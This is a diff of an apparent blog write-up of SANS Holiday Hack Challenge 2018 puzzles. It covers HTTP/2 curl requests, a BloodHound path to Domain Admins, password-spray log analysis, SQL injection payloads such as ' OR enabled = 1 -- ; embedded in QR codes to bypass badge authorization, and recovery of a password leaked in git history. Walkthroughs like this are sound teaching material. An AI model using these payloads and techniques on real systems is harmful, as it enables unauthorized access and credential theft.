+WARNING: The &quot;syslog&quot; option is deprecated
 Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
 putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
 elf@e248923eadbe:~$ 
                                                                                
-                               .;;;;;;;;;;;;;;;&#39;                               
+                               .;;;;;;;;;;;;;;;'                               
                              ,NWOkkkkkkkkkkkkkkNN;                             
                            ..KM; Stall Mucking ,MN..                           
                          OMNXNMd.             .oMWXXM0.                        
                         ;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
-                        :MO                         xMl             &#39;.         
+                        :MO                         xMl             '.         
                         :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
  .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
- &#39;kkkkxxxxxddddddoooooooxMO   ..&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.        xMkcccccccllllllllllooc.   
- &#39;kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
- &#39;kkkkxxxxxddddddoooooooxMO   &#39;::::::::::::,        xMkcccccccllllllllllool,   
- .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll&#39;     
-                        :MO  .ONNNNNNNNXk           xMl             :lc&#39;       
+ 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
+ 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
+ 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
+ .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
+                        :MO  .ONNNNNNNNXk           xMl             :lc'       
                         :MO   dOOOOOOOOOo           xMl             ;.         
-                        :MO   &#39;cccccccccccccc:&#39;     xMl                        
+                        :MO   'cccccccccccccc:'     xMl                        
                         :MO  .WMMMMMMMMMMMMMMMW.    xMl                        
                         :MO    ...............      xMl                        
-                        .NWxddddddddddddddddddddddddNW&#39;                        
+                        .NWxddddddddddddddddddddddddNW'                        
                           ;ccccccccccccccccccccccccc;                          
                                                                                
 You have found the credentials I just had forgot,
-And in doing so you&#39;ve saved me trouble untold.
-Going forward we&#39;ll leave behind policies old,
+And in doing so you've saved me trouble untold.
+Going forward we'll leave behind policies old,
 Building separate accounts for each elf in the lot.
--Wunorse Openslae</code></pre>
-<hr>
-<h1 id=5-ad-privilege-discovery>5. AD Privilege Discovery</h1>
-<p>Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.</p>
-<p><a href=https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova rel=nofollow target=_blank>https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova</a></p>
-<h2 id=curling-master>CURLing Master</h2>
-<p>Supposedly the trigger to start the "Candy Striper" is an "arcane HTTP/2 call."</p>
-<p>Hint is the introduction to HTTP/2: <a href=https://developers.google.com/web/fundamentals/performance/http2/ rel=nofollow target=_blank>https://developers.google.com/web/fundamentals/performance/http2/</a></p>
+-Wunorse Openslae
+</code></pre><hr>
+<h1 id=5-ad-privilege-discovery>5. AD Privilege Discovery
+<a class=header-link href=#5-ad-privilege-discovery><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.</p>
+<p><a href=https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova target=_blank rel="noreferrer noopener">https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova</a></p>
+<h2 id=curling-master>CURLing Master
+<a class=header-link href=#curling-master><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Supposedly the trigger to start the "Candy Striper" is an "arcane HTTP/2 call."</p>
+<p>Hint is the introduction to HTTP/2: <a href=https://developers.google.com/web/fundamentals/performance/http2/ target=_blank rel="noreferrer noopener">https://developers.google.com/web/fundamentals/performance/http2/</a></p>
 <p>Contents of <code>/etc/nginx/nginx.conf</code></p>
 <pre tabindex=0><code class=language-conf data-lang=conf>elf@7ed57fd514a3:~$ cat /etc/nginx/nginx.conf 
 user www-data;
@@ -670,7 +684,7 @@ http {
                     }
 
                     # Mitigate https://httpoxy.org/ vulnerabilities
-                    fastcgi_param HTTP_PROXY &#34;&#34;;
+                    fastcgi_param HTTP_PROXY &quot;&quot;;
 
                     # fastcgi_pass 127.0.0.1:9000;
                     fastcgi_pass unix:/var/run/php/php-fpm.sock;
@@ -694,7 +708,7 @@ http {
         # Gzip Settings
         ##
         gzip on;
-        gzip_disable &#34;msie6&#34;;
+        gzip_disable &quot;msie6&quot;;
         # gzip_vary on;
         # gzip_proxied any;
         # gzip_comp_level 6;
@@ -706,10 +720,10 @@ http {
         ##
         include /etc/nginx/conf.d/*.conf;
         include /etc/nginx/sites-enabled/*;
-}</code></pre>
-<p>Looking at history (use the <code>up</code> arrow key), we get some commands including this:</p>
-<pre tabindex=0><code>curl --http2-prior-knowledge http://localhost:8080/index.php</code></pre>
-<p>Running the command gets us</p>
+}
+</code></pre><p>Looking at history (use the <code>up</code> arrow key), we get some commands including this:</p>
+<pre tabindex=0><code>curl --http2-prior-knowledge http://localhost:8080/index.php
+</code></pre><p>Running the command gets us</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#268bd2>html</span>&gt;
  &lt;<span style=color:#268bd2>head</span>&gt;
   &lt;<span style=color:#268bd2>title</span>&gt;Candy Striper Turner-On&#39;er&lt;/<span style=color:#268bd2>title</span>&gt;
@@ -718,9 +732,10 @@ http {
  &lt;<span style=color:#268bd2>p</span>&gt;To turn the machine on, simply POST to this URL with parameter &#34;status=on&#34;
  
  &lt;/<span style=color:#268bd2>body</span>&gt;
-&lt;/<span style=color:#268bd2>html</span>&gt;</code></pre></div>
-<p>We can send this:</p>
-<pre tabindex=0><code>curl -d &#34;status=on&#34; -X POST http://localhost:8080/index.php --http2-prior-knowledge</code></pre><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>$ curl -d &#34;status=on&#34; -X POST http://localhost:8080/index.php --http2-prior-knowledge
+&lt;/<span style=color:#268bd2>html</span>&gt;
+</code></pre></div><p>We can send this:</p>
+<pre tabindex=0><code>curl -d &quot;status=on&quot; -X POST http://localhost:8080/index.php --http2-prior-knowledge
+</code></pre><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>$ curl -d &#34;status=on&#34; -X POST http://localhost:8080/index.php --http2-prior-knowledge
 &lt;<span style=color:#268bd2>html</span>&gt;
  &lt;<span style=color:#268bd2>head</span>&gt;
   &lt;<span style=color:#268bd2>title</span>&gt;Candy Striper Turner-On&#39;er&lt;/<span style=color:#268bd2>title</span>&gt;
@@ -755,28 +770,32 @@ TLS connections are in place when they do so.
 &lt;<span style=color:#268bd2>p</span>&gt;Congratulations! You&#39;ve won and have successfully completed this challenge.
 &lt;<span style=color:#268bd2>p</span>&gt;POSTing data in HTTP/2.0.
  &lt;/<span style=color:#268bd2>body</span>&gt;
-&lt;/<span style=color:#268bd2>html</span>&gt;</code></pre></div>
-<h1 id=now-the-vm>Now the VM</h1>
-<p>Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.</p>
-<p><a href=https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova rel=nofollow target=_blank>https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova</a></p>
+&lt;/<span style=color:#268bd2>html</span>&gt;
+</code></pre></div>
+<h1 id=now-the-vm>Now the VM
+<a class=header-link href=#now-the-vm><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.</p>
+<p><a href=https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova target=_blank rel="noreferrer noopener">https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova</a></p>
 <p>Use Bloodhound, it's on desktop. There's a built-in query for getting to domain admin from Kerberoastable accounts.</p>
 <p>Some of them need RDP which is not what we want but one stands out.</p>
-<p>LDUBEJ00320@AD.KRINGLECASTLE.COM</p>
+<p><a href=mailto:LDUBEJ00320@AD.KRINGLECASTLE.COM>LDUBEJ00320@AD.KRINGLECASTLE.COM</a></p>
 <hr>
-<h1 id=6-badge-manipulation>6. Badge Manipulation</h1>
-<p>Need to do the yule log analysis for hints?</p>
-<h2 id=yule-log-analysis>Yule Log Analysis</h2>
-<pre tabindex=0><code>I am Pepper Minstix, and I&#39;m looking for your help.
+<h1 id=6-badge-manipulation>6. Badge Manipulation
+<a class=header-link href=#6-badge-manipulation><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Need to do the yule log analysis for hints?</p>
+<h2 id=yule-log-analysis>Yule Log Analysis
+<a class=header-link href=#yule-log-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><pre tabindex=0><code>I am Pepper Minstix, and I'm looking for your help.
 Bad guys have us tangled up in pepperminty kelp!
-&#34;Password spraying&#34; is to blame for this our grinchly fate.
+&quot;Password spraying&quot; is to blame for this our grinchly fate.
 Should we blame our password policies which users hate?
-Here you&#39;ll find a web log filled with failure and success.
+Here you'll find a web log filled with failure and success.
 One successful login there requires your redress.
 Can you help us figure out which user was attacked?
 Tell us who fell victim, and please handle this with tact...
   Submit the compromised webmail username to 
-  runtoanswer to complete this challenge.</code></pre>
-<p>There's an <code>evtx</code> file and a python script to dump it as xml.</p>
+  runtoanswer to complete this challenge.
+</code></pre><p>There's an <code>evtx</code> file and a python script to dump it as xml.</p>
 <p><code>python evtx_dump.py ho-ho-no.evtx > dumped</code></p>
 <p>And then I ran <code>cat dumped</code> and copied everything to a local text file here.</p>
 <p>Supposedly they had done a password spray and then a successful login. We need to see those password sprays. If one of them successful in the spray then it should be a successful logon (<code>4624</code> event ID) in between a ton of unsuccessful logons (<code>4625</code>).</p>
@@ -829,9 +848,11 @@ Tell us who fell victim, and please handle this with tact...
 <span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;TargetLinkedLogonId&#34;</span><span style=color:#268bd2>&gt;</span>0x0000000000000000<span style=color:#268bd2>&lt;/Data&gt;</span>
 <span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;ElevatedToken&#34;</span><span style=color:#268bd2>&gt;</span>%%1842<span style=color:#268bd2>&lt;/Data&gt;</span>
 <span style=color:#268bd2>&lt;/EventData&gt;</span>
-<span style=color:#268bd2>&lt;/Event&gt;</span></code></pre></div>
-<h2 id=scan-o-matic>scan-o-matic</h2>
-<p>Upload QRcode with payload to do SQLi.</p>
+<span style=color:#268bd2>&lt;/Event&gt;</span>
+</code></pre></div>
+<h2 id=scan-o-matic>scan-o-matic
+<a class=header-link href=#scan-o-matic><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Upload QRcode with payload to do SQLi.</p>
 <p>This is what the request looks like:</p>
 <pre tabindex=0><code>POST /upload HTTP/1.1
 Host: scanomatic.kringlecastle.com
@@ -846,8 +867,8 @@ Content-Length: 16
 Connection: close
 Cookie: resource_id=false
 
-b64barcode=ddddd</code></pre>
-<p>This results in an exception that is part of the challenge:</p>
+b64barcode=ddddd
+</code></pre><p>This results in an exception that is part of the challenge:</p>
 <pre tabindex=0><code>HTTP/1.1 200 OK
 Server: nginx/1.10.3
 Date: Sun, 30 Dec 2018 04:32:50 GMT
@@ -855,8 +876,8 @@ Content-Type: application/json
 Content-Length: 151
 Connection: close
 
-{&#34;data&#34;:&#34;EXCEPTION AT (LINE 135 \&#34;temp_file.write(base64.b64decode(request.form[&#39;b64barcode&#39;].split(&#39;,&#39;)[-1]))\&#34;): Incorrect padding&#34;,&#34;request&#34;:false}</code></pre>
-<p>Now we if upload a QRcode with payload <code>hello'</code>, we get this response:</p>
+{&quot;data&quot;:&quot;EXCEPTION AT (LINE 135 \&quot;temp_file.write(base64.b64decode(request.form['b64barcode'].split(',')[-1]))\&quot;): Incorrect padding&quot;,&quot;request&quot;:false}
+</code></pre><p>Now we if upload a QRcode with payload <code>hello'</code>, we get this response:</p>
 <pre tabindex=0><code>HTTP/1.1 200 OK
 Server: nginx/1.10.3
 Date: Sun, 30 Dec 2018 04:32:28 GMT
@@ -864,51 +885,56 @@ Content-Type: application/json
 Content-Length: 363
 Connection: close
 
-{&#34;data&#34;:&#34;EXCEPTION AT (LINE 96 \&#34;user_info = query(\&#34;SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = &#39;{}&#39; LIMIT 1\&#34;.format(uid))\&#34;): (1064, u\&#34;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;hello&#39;&#39; LIMIT 1&#39; at line 1\&#34;)&#34;,&#34;request&#34;:false}</code></pre>
-<p>We can learn a few things:</p>
+{&quot;data&quot;:&quot;EXCEPTION AT (LINE 96 \&quot;user_info = query(\&quot;SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\&quot;.format(uid))\&quot;): (1064, u\&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''hello'' LIMIT 1' at line 1\&quot;)&quot;,&quot;request&quot;:false}
+</code></pre><p>We can learn a few things:</p>
 <ul>
 <li>It's running MariaDB.</li>
 <li>Original SQL query is
 <ul>
 <li><code>SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1"</code></li>
-</ul></li>
+</ul>
+</li>
 <li>Payload is injected in the value of <code>uid</code>.</li>
 <li>If the format of the query is correct, we get these responses
 <ul>
 <li><code>{"data":"Authorized User Account Has Been Disabled!","request":false}</code></li>
 <li><code>{"data":"No Authorized User Account Found!","request":false}</code> I got this for <code>hello' or '1'='1 -- ;</code>.</li>
-</ul></li>
+</ul>
+</li>
 <li>Remember to pass a whitespace and a char after the comment for MariaDB to count it as a comment.</li>
 </ul>
-<h3 id=payload>Payload</h3>
-<p>3.png: <code>hello' OR '1'='1 -- ;</code>
+<h3 id=payload>Payload
+<a class=header-link href=#payload><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><p>3.png: <code>hello' OR '1'='1 -- ;</code>
 4.png: <code>hello' OR 1=1 -- ;</code>
 5.png: <code>hello' AND enabled = 1 OR 1=1 -- ;</code>
-6.png: <code>hello' AND enabled = true OR 1=1 -- ;</code> (1 and 0 are aliases for true and false in MariaDB)</p>
+6.png: <code>hello' AND enabled = true OR 1=1 -- ; </code> (1 and 0 are aliases for true and false in MariaDB)</p>
 <p>Correct payload is <code>' OR enabled = 1 -- ;</code></p>
 <p><code>SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '' OR enabled = 1 -- ; ' LIMIT 1</code></p>
 <p>Response is</p>
-<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{<span style=color:#268bd2>&#34;data&#34;</span>:<span style=color:#2aa198>&#34;User Access Granted - Control number 19880715&#34;</span>,<span style=color:#268bd2>&#34;request&#34;</span>:<span style=color:#cb4b16>true</span>,<span style=color:#268bd2>&#34;success&#34;</span>:{<span style=color:#268bd2>&#34;hash&#34;</span>:<span style=color:#2aa198>&#34;ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb&#34;</span>,<span style=color:#268bd2>&#34;resourceId&#34;</span>:<span style=color:#2aa198>&#34;false&#34;</span>}}</code></pre></div>
-<p>Answer is <code>19880715</code>. And we are in Santa's secret room.</p>
-<h1 id=7-hr-incident-response>7. HR Incident Response</h1>
-<p>Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.</p>
-<p>Website is <a href=https://careers.kringlecastle.com/ rel=nofollow target=_blank>https://careers.kringlecastle.com/</a>.</p>
-<h2 id=dev-ops-fail>Dev Ops Fail</h2>
-<pre tabindex=0><code>Coalbox again, and I&#39;ve got one more ask.
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{<span style=color:#268bd2>&#34;data&#34;</span>:<span style=color:#2aa198>&#34;User Access Granted - Control number 19880715&#34;</span>,<span style=color:#268bd2>&#34;request&#34;</span>:<span style=color:#cb4b16>true</span>,<span style=color:#268bd2>&#34;success&#34;</span>:{<span style=color:#268bd2>&#34;hash&#34;</span>:<span style=color:#2aa198>&#34;ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb&#34;</span>,<span style=color:#268bd2>&#34;resourceId&#34;</span>:<span style=color:#2aa198>&#34;false&#34;</span>}}
+</code></pre></div><p>Answer is <code>19880715</code>. And we are in Santa's secret room.</p>
+<h1 id=7-hr-incident-response>7. HR Incident Response
+<a class=header-link href=#7-hr-incident-response><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.</p>
+<p>Website is <a href=https://careers.kringlecastle.com/ target=_blank rel="noreferrer noopener">https://careers.kringlecastle.com/</a>.</p>
+<h2 id=dev-ops-fail>Dev Ops Fail
+<a class=header-link href=#dev-ops-fail><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><pre tabindex=0><code>Coalbox again, and I've got one more ask.
 Sparkle Q. Redberry has fumbled a task.
 Git pull and merging, she did all the day;
 With all this gitting, some creds got away.
-Urging - I scolded, &#34;Don&#39;t put creds in git!&#34;
-She said, &#34;Don&#39;t worry - you&#39;re having a fit.
+Urging - I scolded, &quot;Don't put creds in git!&quot;
+She said, &quot;Don't worry - you're having a fit.
 If I did drop them then surely I could,
-Upload some new code done up as one should.&#34;
+Upload some new code done up as one should.&quot;
 Though I would like to believe this here elf,
-I&#39;m worried we&#39;ve put some creds on a shelf.
-Any who&#39;s curious might find our &#34;oops,&#34;
+I'm worried we've put some creds on a shelf.
+Any who's curious might find our &quot;oops,&quot;
 Please find it fast before some other snoops!
 
-Find Sparkle&#39;s password, then run the runtoanswer tool.</code></pre>
-<p>Go inside <code>kcconfmgmt</code> and see it's a git repo. Apparently she put user/pass in the git repo and overwrote it and we need to find it.</p>
+Find Sparkle's password, then run the runtoanswer tool.
+</code></pre><p>Go inside <code>kcconfmgmt</code> and see it's a git repo. Apparently she put user/pass in the git repo and overwrote it and we need to find it.</p>
 <pre tabindex=0><code>elf@03a47cb7373b:~/kcconfmgmt$ ls -alt
 total 72
 drwxr-xr-x 1 elf elf  4096 Dec 14 16:30 ..
@@ -921,8 +947,8 @@ drwxr-xr-x 1 elf elf  4096 Nov 14 09:47 server
 drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 public
 drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 routes
 drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 views
--rw-r--r-- 1 elf elf    66 Nov  1 15:30 README.md</code></pre>
-<p>Either <code>grep -ir password</code> or do <code>git log -10</code> to see the last 10 commit messages.</p>
+-rw-r--r-- 1 elf elf    66 Nov  1 15:30 README.md
+</code></pre><p>Either <code>grep -ir password</code> or do <code>git log -10</code> to see the last 10 commit messages.</p>
 <p>One of the commit messages is</p>
 <pre tabindex=0><code>commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
 Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
@@ -933,58 +959,62 @@ Date:   Thu Nov 8 21:11:03 2018 -0500
 commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
 Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
 Date:   Thu Nov 8 13:25:32 2018 -0500
-    Add passport module</code></pre>
-<p>So it was in <code>config.js</code>. It has been replaced by <code>config.js.def</code>.</p>
+    Add passport module
+</code></pre><p>So it was in <code>config.js</code>. It has been replaced by <code>config.js.def</code>.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>elf@<span style=color:#2aa198>03</span>a47cb7373b<span style=color:#719e07>:~</span>/kcconfmgmt/server/config$ cat config.js.def 
 <span style=color:#586e75>// Database URL
 </span><span style=color:#586e75></span>module.exports <span style=color:#719e07>=</span> {
     <span style=color:#2aa198>&#39;url&#39;</span> <span style=color:#719e07>:</span> <span style=color:#2aa198>&#39;mongodb://username:password@127.0.0.1:27017/node-api&#39;</span>
-};</code></pre></div>
-<p>But instead of going around and trying to figure out the stuff in the <code>.git</code> directory, we can just revert to the commit BEFORE THAT and then look inside that file.</p>
+};
+</code></pre></div><p>But instead of going around and trying to figure out the stuff in the <code>.git</code> directory, we can just revert to the commit BEFORE THAT and then look inside that file.</p>
 <p><code>git checkout b2376f4a</code></p>
 <p>Now we can see inside <code>config.js</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>elf@<span style=color:#2aa198>03</span>a47cb7373b<span style=color:#719e07>:~</span>/kcconfmgmt/server/config$ cat config.js 
 <span style=color:#586e75>// Database URL
 </span><span style=color:#586e75></span>module.exports <span style=color:#719e07>=</span> {
     <span style=color:#2aa198>&#39;url&#39;</span> <span style=color:#719e07>:</span> <span style=color:#2aa198>&#39;mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api&#39;</span>
-};</code></pre></div>
-<p>Answer is <code>twinkletwinkletwinkle</code>.</p>
+};
+</code></pre></div><p>Answer is <code>twinkletwinkletwinkle</code>.</p>
 <pre tabindex=0><code>elf@cb4b2e9db7f3:~$ runtoanswer twinkletwinkletwinkle
 Loading, please wait......
 
-Enter Sparkle Redberry&#39;s password: twinkletwinkletwinkle
+Enter Sparkle Redberry's password: twinkletwinkletwinkle
 
-This ain&#39;t &#34;I told you so&#34; time, but it&#39;s true:
+This ain't &quot;I told you so&quot; time, but it's true:
 I shake my head at the goofs we go through.
-Everyone knows that the gits aren&#39;t the place;
+Everyone knows that the gits aren't the place;
 Store your credentials in some safer space.
 
-Congratulations!</code></pre>
-<h2 id=https-careers-kringlecastle-com><a href=https://careers.kringlecastle.com/ rel=nofollow target=_blank>https://careers.kringlecastle.com/</a></h2>
-<p>Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.</p>
+Congratulations!
+</code></pre>
+<h2 id=httpscareerskringlecastlecom><a href=https://careers.kringlecastle.com/ target=_blank rel="noreferrer noopener">https://careers.kringlecastle.com/</a>
